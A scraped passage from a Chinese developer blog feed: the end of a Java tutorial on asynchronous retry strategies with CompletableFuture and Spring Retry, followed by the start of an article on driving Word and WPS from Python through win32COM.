    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> &lt;T&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">retryAsync</span><span class="hljs-params">(
            Supplier&lt;CompletableFuture&lt;T&gt;&gt; task, 
            <span class="hljs-type">int</span> maxAttempts, 
            <span class="hljs-type">long</span> delayMs, 
            <span class="hljs-type">int</span> attempt, 
            CompletableFuture&lt;T&gt; result)</span> {
        
        task.get().whenComplete((response, throwable) -&gt; {
            <span class="hljs-keyword">if</span> (throwable == <span class="hljs-literal">null</span>) {
                result.complete(response);
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (attempt &gt;= maxAttempts) {
                result.completeExceptionally(throwable);
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// 延迟后重试</span>
                CompletableFuture.delayedExecutor(delayMs, TimeUnit.MILLISECONDS)
                    .execute(() -&gt; retryAsync(task, maxAttempts, delayMs, attempt + <span class="hljs-number">1</span>, result));
            }
        });
    }
}
</code></pre>
<h3 data-id="heading-14">3.2 使用 Spring Retry</h3>
<h4 data-id="heading-15">3.2.1 添加依赖</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.retry<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-retry<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-aspects<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.3.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h4 data-id="heading-16">3.2.2 配置重试模板</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@EnableRetry</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RetryConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> RetryTemplate <span class="hljs-title function_">retryTemplate</span><span class="hljs-params">()</span> {
        <span class="hljs-type">RetryTemplate</span> <span class="hljs-variable">template</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RetryTemplate</span>();
        
        <span class="hljs-comment">// 重试策略：最多重试3次，遇到特定异常时重试</span>
        <span class="hljs-type">SimpleRetryPolicy</span> <span class="hljs-variable">retryPolicy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleRetryPolicy</span>(<span class="hljs-number">3</span>, 
            Collections.singletonMap(RuntimeException.class, <span class="hljs-literal">true</span>));
        template.setRetryPolicy(retryPolicy);
        
        <span class="hljs-comment">// 退避策略：每次重试间隔1秒</span>
        <span class="hljs-type">FixedBackOffPolicy</span> <span class="hljs-variable">backOffPolicy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FixedBackOffPolicy</span>();
        backOffPolicy.setBackOffPeriod(<span class="hljs-number">1000</span>);
        template.setBackOffPolicy(backOffPolicy);
        
        <span class="hljs-keyword">return</span> template;
    }
}
</code></pre>
<h4 data-id="heading-17">3.2.3 使用 @Retryable 注解</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RetryableService</span> {
    
    <span class="hljs-meta">@Retryable(
        value = {RuntimeException.class},
        maxAttempts = 3,
        backoff = @Backoff(delay = 1000)
    )</span>
    <span class="hljs-meta">@Async</span>
    <span class="hljs-keyword">public</span> CompletableFuture&lt;String&gt; <span class="hljs-title function_">retryableAsyncMethod</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> CompletableFuture.supplyAsync(() -&gt; {
            <span class="hljs-comment">// 模拟可能失败的操作</span>
            <span class="hljs-keyword">if</span> (Math.random() &lt; <span class="hljs-number">0.7</span>) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"临时错误"</span>);
            }
            <span class="hljs-keyword">return</span> <span class="hljs-string">"成功结果"</span>;
        });
    }
    
    <span class="hljs-meta">@Recover</span>
    <span class="hljs-keyword">public</span> CompletableFuture&lt;String&gt; <span class="hljs-title function_">recover</span><span class="hljs-params">(RuntimeException e)</span> {
        <span class="hljs-keyword">return</span> CompletableFuture.completedFuture(<span class="hljs-string">"降级结果"</span>);
    }
}
</code></pre>
<h3 data-id="heading-18">3.3 高级重试策略实现</h3>
<h4 data-id="heading-19">3.3.1 指数退避重试</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExponentialBackoffRetry</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; CompletableFuture&lt;T&gt; <span class="hljs-title function_">retryWithExponentialBackoff</span><span class="hljs-params">(
            Supplier&lt;CompletableFuture&lt;T&gt;&gt; task,
            <span class="hljs-type">int</span> maxAttempts,
            <span class="hljs-type">long</span> initialDelay,
            <span class="hljs-type">long</span> maxDelay)</span> {
        
        <span class="hljs-keyword">return</span> retryWithExponentialBackoff(task, maxAttempts, initialDelay, maxDelay, <span class="hljs-number">1</span>);
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> &lt;T&gt; CompletableFuture&lt;T&gt; <span class="hljs-title function_">retryWithExponentialBackoff</span><span class="hljs-params">(
            Supplier&lt;CompletableFuture&lt;T&gt;&gt; task,
            <span class="hljs-type">int</span> maxAttempts,
            <span class="hljs-type">long</span> initialDelay,
            <span class="hljs-type">long</span> maxDelay,
            <span class="hljs-type">int</span> attempt)</span> {
        
        CompletableFuture&lt;T&gt; future = task.get();
        
        <span class="hljs-keyword">if</span> (attempt &gt;= maxAttempts) {
            <span class="hljs-keyword">return</span> future;
        }
        
        <span class="hljs-keyword">return</span> future.handle((result, throwable) -&gt; {
            <span class="hljs-keyword">if</span> (throwable == <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">return</span> CompletableFuture.completedFuture(result);
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// 计算退避时间</span>
                <span class="hljs-type">long</span> <span class="hljs-variable">delay</span> <span class="hljs-operator">=</span> Math.min(maxDelay, initialDelay * (<span class="hljs-type">long</span>) Math.pow(<span class="hljs-number">2</span>, attempt - <span class="hljs-number">1</span>));
                
                <span class="hljs-comment">// 添加随机抖动避免惊群效应</span>
                delay = (<span class="hljs-type">long</span>) (delay * (<span class="hljs-number">0.5</span> + Math.random()));
                
                CompletableFuture&lt;T&gt; nextAttempt = CompletableFuture
                    .delayedExecutor(delay, TimeUnit.MILLISECONDS)
                    .supplyAsync(() -&gt; 
                        retryWithExponentialBackoff(task, maxAttempts, initialDelay, maxDelay, attempt + <span class="hljs-number">1</span>)
                    )
                    .thenCompose(cf -&gt; cf);
                
                <span class="hljs-keyword">return</span> nextAttempt;
            }
        }).thenCompose(cf -&gt; cf);
    }
}
</code></pre>
<h4 data-id="heading-20">3.3.2 基于条件的重试</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConditionalRetry</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; CompletableFuture&lt;T&gt; <span class="hljs-title function_">retryWithCondition</span><span class="hljs-params">(
            Supplier&lt;CompletableFuture&lt;T&gt;&gt; task,
            Predicate&lt;Throwable&gt; shouldRetry,
            <span class="hljs-type">int</span> maxAttempts,
            Function&lt;Integer, Long&gt; delayCalculator)</span> {
        
        CompletableFuture&lt;T&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompletableFuture</span>&lt;&gt;();
        retryWithCondition(task, shouldRetry, maxAttempts, delayCalculator, <span class="hljs-number">1</span>, result);
        <span class="hljs-keyword">return</span> result;
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> &lt;T&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">retryWithCondition</span><span class="hljs-params">(
            Supplier&lt;CompletableFuture&lt;T&gt;&gt; task,
            Predicate&lt;Throwable&gt; shouldRetry,
            <span class="hljs-type">int</span> maxAttempts,
            Function&lt;Integer, Long&gt; delayCalculator,
            <span class="hljs-type">int</span> attempt,
            CompletableFuture&lt;T&gt; result)</span> {
        
        task.get().whenComplete((response, throwable) -&gt; {
            <span class="hljs-keyword">if</span> (throwable == <span class="hljs-literal">null</span>) {
                result.complete(response);
                <span class="hljs-keyword">return</span>;
            }
            
            <span class="hljs-type">boolean</span> <span class="hljs-variable">canRetry</span> <span class="hljs-operator">=</span> attempt &lt; maxAttempts &amp;&amp; shouldRetry.test(throwable);
            
            <span class="hljs-keyword">if</span> (!canRetry) {
                result.completeExceptionally(throwable);
                <span class="hljs-keyword">return</span>;
            }
            
            <span class="hljs-type">long</span> <span class="hljs-variable">delay</span> <span class="hljs-operator">=</span> delayCalculator.apply(attempt);
            CompletableFuture.delayedExecutor(delay, TimeUnit.MILLISECONDS)
                .execute(() -&gt; 
                    retryWithCondition(task, shouldRetry, maxAttempts, delayCalculator, attempt + <span class="hljs-number">1</span>, result)
                );
        });
    }
}
</code></pre>
<h3 data-id="heading-21">3.4 完整的重试工具类</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AsyncRetryUtil</span> {
    
    <span class="hljs-comment">/**
     * 异步重试执行器
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AsyncRetryBuilder</span>&lt;T&gt; {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Supplier&lt;CompletableFuture&lt;T&gt;&gt; task;
        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">maxAttempts</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>;
        <span class="hljs-keyword">private</span> Predicate&lt;Throwable&gt; retryCondition = ex -&gt; <span class="hljs-literal">true</span>;
        <span class="hljs-keyword">private</span> Function&lt;Integer, Long&gt; delayStrategy = attempt -&gt; <span class="hljs-number">1000L</span> * attempt;
        <span class="hljs-keyword">private</span> Consumer&lt;Integer&gt; onRetry = attempt -&gt; {};
        <span class="hljs-keyword">private</span> Function&lt;Throwable, T&gt; fallback = <span class="hljs-literal">null</span>;
        
        <span class="hljs-keyword">private</span> <span class="hljs-title function_">AsyncRetryBuilder</span><span class="hljs-params">(Supplier&lt;CompletableFuture&lt;T&gt;&gt; task)</span> {
            <span class="hljs-built_in">this</span>.task = task;
        }
        
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; AsyncRetryBuilder&lt;T&gt; <span class="hljs-title function_">of</span><span class="hljs-params">(Supplier&lt;CompletableFuture&lt;T&gt;&gt; task)</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AsyncRetryBuilder</span>&lt;&gt;(task);
        }
        
        <span class="hljs-keyword">public</span> AsyncRetryBuilder&lt;T&gt; <span class="hljs-title function_">maxAttempts</span><span class="hljs-params">(<span class="hljs-type">int</span> maxAttempts)</span> {
            <span class="hljs-built_in">this</span>.maxAttempts = maxAttempts;
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
        }
        
        <span class="hljs-keyword">public</span> AsyncRetryBuilder&lt;T&gt; <span class="hljs-title function_">retryIf</span><span class="hljs-params">(Predicate&lt;Throwable&gt; condition)</span> {
            <span class="hljs-built_in">this</span>.retryCondition = condition;
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
        }
        
        <span class="hljs-keyword">public</span> AsyncRetryBuilder&lt;T&gt; <span class="hljs-title function_">delayStrategy</span><span class="hljs-params">(Function&lt;Integer, Long&gt; strategy)</span> {
            <span class="hljs-built_in">this</span>.delayStrategy = strategy;
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
        }
        
        <span class="hljs-keyword">public</span> AsyncRetryBuilder&lt;T&gt; <span class="hljs-title function_">onRetry</span><span class="hljs-params">(Consumer&lt;Integer&gt; callback)</span> {
            <span class="hljs-built_in">this</span>.onRetry = callback;
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
        }
        
        <span class="hljs-keyword">public</span> AsyncRetryBuilder&lt;T&gt; <span class="hljs-title function_">fallback</span><span class="hljs-params">(Function&lt;Throwable, T&gt; fallback)</span> {
            <span class="hljs-built_in">this</span>.fallback = fallback;
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
        }
        
        <span class="hljs-keyword">public</span> CompletableFuture&lt;T&gt; <span class="hljs-title function_">execute</span><span class="hljs-params">()</span> {
            CompletableFuture&lt;T&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompletableFuture</span>&lt;&gt;();
            execute(<span class="hljs-number">1</span>, result);
            <span class="hljs-keyword">return</span> result;
        }
        
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(<span class="hljs-type">int</span> attempt, CompletableFuture&lt;T&gt; result)</span> {
            task.get().whenComplete((response, throwable) -&gt; {
                <span class="hljs-keyword">if</span> (throwable == <span class="hljs-literal">null</span>) {
                    result.complete(response);
                    <span class="hljs-keyword">return</span>;
                }
                
                <span class="hljs-type">boolean</span> <span class="hljs-variable">shouldRetry</span> <span class="hljs-operator">=</span> attempt &lt; maxAttempts &amp;&amp; retryCondition.test(throwable);
                
                <span class="hljs-keyword">if</span> (!shouldRetry) {
                    <span class="hljs-keyword">if</span> (fallback != <span class="hljs-literal">null</span>) {
                        <span class="hljs-keyword">try</span> {
                            <span class="hljs-type">T</span> <span class="hljs-variable">fallbackResult</span> <span class="hljs-operator">=</span> fallback.apply(throwable);
                            result.complete(fallbackResult);
                        } <span class="hljs-keyword">catch</span> (Exception e) {
                            result.completeExceptionally(e);
                        }
                    } <span class="hljs-keyword">else</span> {
                        result.completeExceptionally(throwable);
                    }
                    <span class="hljs-keyword">return</span>;
                }
                
                onRetry.accept(attempt);
                <span class="hljs-type">long</span> <span class="hljs-variable">delay</span> <span class="hljs-operator">=</span> delayStrategy.apply(attempt);
                
                CompletableFuture.delayedExecutor(delay, TimeUnit.MILLISECONDS)
                    .execute(() -&gt; execute(attempt + <span class="hljs-number">1</span>, result));
            });
        }
    }
}
</code></pre>
<h3 data-id="heading-22">3.5 使用示例</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RetryExample</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 模拟不可靠的服务</span>
        Supplier&lt;CompletableFuture&lt;String&gt;&gt; unreliableService = () -&gt; 
            CompletableFuture.supplyAsync(() -&gt; {
                <span class="hljs-type">double</span> <span class="hljs-variable">rand</span> <span class="hljs-operator">=</span> Math.random();
                <span class="hljs-keyword">if</span> (rand &lt; <span class="hljs-number">0.8</span>) {
                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"服务暂时不可用"</span>);
                }
                <span class="hljs-keyword">return</span> <span class="hljs-string">"服务调用成功"</span>;
            });
        
        <span class="hljs-comment">// 使用重试工具</span>
        CompletableFuture&lt;String&gt; result = AsyncRetryUtil.AsyncRetryBuilder
            .of(unreliableService)
            .maxAttempts(<span class="hljs-number">5</span>)
            .retryIf(ex -&gt; ex.getMessage().contains(<span class="hljs-string">"暂时不可用"</span>))
            .delayStrategy(attempt -&gt; <span class="hljs-number">1000L</span> * attempt) <span class="hljs-comment">// 线性退避</span>
            .onRetry(attempt -&gt; 
                System.out.println(<span class="hljs-string">"第 "</span> + attempt + <span class="hljs-string">" 次重试..."</span>))
            .fallback(ex -&gt; <span class="hljs-string">"降级结果"</span>)
            .execute();
        
        result.whenComplete((response, error) -&gt; {
            <span class="hljs-keyword">if</span> (error != <span class="hljs-literal">null</span>) {
                System.out.println(<span class="hljs-string">"最终失败: "</span> + error.getMessage());
            } <span class="hljs-keyword">else</span> {
                System.out.println(<span class="hljs-string">"最终结果: "</span> + response);
            }
        });
        
        <span class="hljs-comment">// 等待异步操作完成</span>
        Thread.sleep(<span class="hljs-number">10000</span>);
    }
}
</code></pre>
<h2 data-id="heading-23">4. 注意事项</h2>
<h3 data-id="heading-24">4.1 重试策略选择</h3>
<ul>
<li><strong>网络超时</strong>：使用指数退避 + 随机抖动</li>
<li><strong>服务限流</strong>：根据返回的等待时间重试</li>
<li><strong>业务错误</strong>：根据具体错误码决定是否重试</li>
</ul>
<h3 data-id="heading-25">4.2 避免的问题</h3>
<ol>
<li><strong>无限重试</strong>：设置最大重试次数</li>
<li><strong>资源耗尽</strong>：合理控制重试频率</li>
<li><strong>雪崩效应</strong>：使用断路器模式配合重试</li>
<li><strong>重复操作</strong>：确保操作的幂等性</li>
</ol>
<h3 data-id="heading-26">4.3 监控和日志</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 添加重试监控</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RetryMonitor</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">MeterRegistry</span> <span class="hljs-variable">meterRegistry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleMeterRegistry</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">recordRetry</span><span class="hljs-params">(String operation, <span class="hljs-type">int</span> attempt)</span> {
        Counter.builder(<span class="hljs-string">"retry.attempts"</span>)
            .tag(<span class="hljs-string">"operation"</span>, operation)
            .register(meterRegistry)
            .increment();
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">recordSuccess</span><span class="hljs-params">(String operation, <span class="hljs-type">long</span> duration)</span> {
        Timer.builder(<span class="hljs-string">"retry.duration"</span>)
            .tag(<span class="hljs-string">"operation"</span>, operation)
            .tag(<span class="hljs-string">"status"</span>, <span class="hljs-string">"success"</span>)
            .register(meterRegistry)
            .record(duration, TimeUnit.MILLISECONDS);
    }
}
</code></pre>
<p>具体业务场景选择合适的重试策略，提高系统的容错能力和稳定性。</p>
<blockquote>
<p>本文首发于公众号：程序员大华，专注分享前后端开发的实战笔记。关注我，少走弯路，一起进步！</p>
</blockquote>
<h4 data-id="heading-27">📌往期内容</h4>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FUqzEppE_f8gdil6S-toBTg" target="_blank" title="https://mp.weixin.qq.com/s/UqzEppE_f8gdil6S-toBTg" ref="nofollow noopener noreferrer">写前端久了，我用 Node.js 给自己造了几个省力小工具</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FF4JkmYxUs9RAtsti6V1uhg" target="_blank" title="https://mp.weixin.qq.com/s/F4JkmYxUs9RAtsti6V1uhg" ref="nofollow noopener noreferrer">我也是写了很久 TypeScript，才意识到这些写法不对</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F2wHCiqgtRfK_008fLBamPQ" target="_blank" title="https://mp.weixin.qq.com/s/2wHCiqgtRfK_008fLBamPQ" ref="nofollow noopener noreferrer">ThreadLocal 在实际项目中的 6 大用法，原来可以这么简单</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FsMAKhSLNvmU1ddxg0yv9Fg" target="_blank" title="https://mp.weixin.qq.com/s/sMAKhSLNvmU1ddxg0yv9Fg" ref="nofollow noopener noreferrer">重构了20个SpringBoot项目后，总结出这套稳定高效的架构设计</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[python win32COM 对象介绍调用Word、WPS 与应用生态]]></title>    <link>https://juejin.cn/post/7594785614177239080</link>    <guid>https://juejin.cn/post/7594785614177239080</guid>    <pubDate>2026-01-14T06:47:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594785614177239080" data-draft-id="7594745643893063715" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="python win32COM 对象介绍调用Word、WPS 与应用生态"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-01-14T06:47:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="red润"/> <meta itemprop="url" content="https://juejin.cn/user/372051848729127"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            python win32COM 对象介绍调用Word、WPS 与应用生态
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/372051848729127/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    red润
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T06:47:52.000Z" title="Wed Jan 14 2026 06:47:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">python win32COM 对象介绍调用Word、WPS 与应用生态</h2>
<blockquote>
<p>在日常工作中，我们经常会用到各种办公软件，但你是否想过这些软件是如何被程序调用的？</p>
<p>这里我使用<strong>python</strong>语言作为示例</p>
</blockquote>
<h3 data-id="heading-1">com 对照标识符</h3>
<pre><code class="hljs language-makefile" lang="makefile">office_apps = {
    <span class="hljs-comment"># Microsoft Office</span>
    <span class="hljs-string">"Word.Application"</span>: <span class="hljs-string">"Microsoft Word"</span>,
    <span class="hljs-string">"Excel.Application"</span>: <span class="hljs-string">"Microsoft Excel"</span>, 
    <span class="hljs-string">"PowerPoint.Application"</span>: <span class="hljs-string">"Microsoft PowerPoint"</span>,
    <span class="hljs-string">"Outlook.Application"</span>: <span class="hljs-string">"Microsoft Outlook"</span>,
    
    <span class="hljs-comment"># WPS Office</span>
    <span class="hljs-string">"wps.Application"</span>: <span class="hljs-string">"WPS Office (新版)"</span>,
    <span class="hljs-string">"Kwps.Application"</span>: <span class="hljs-string">"WPS 文字"</span>,
    <span class="hljs-string">"Kwpp.Application"</span>: <span class="hljs-string">"WPS 演示"</span>, 
    <span class="hljs-string">"Ket.Application"</span>: <span class="hljs-string">"WPS 表格"</span>,
    
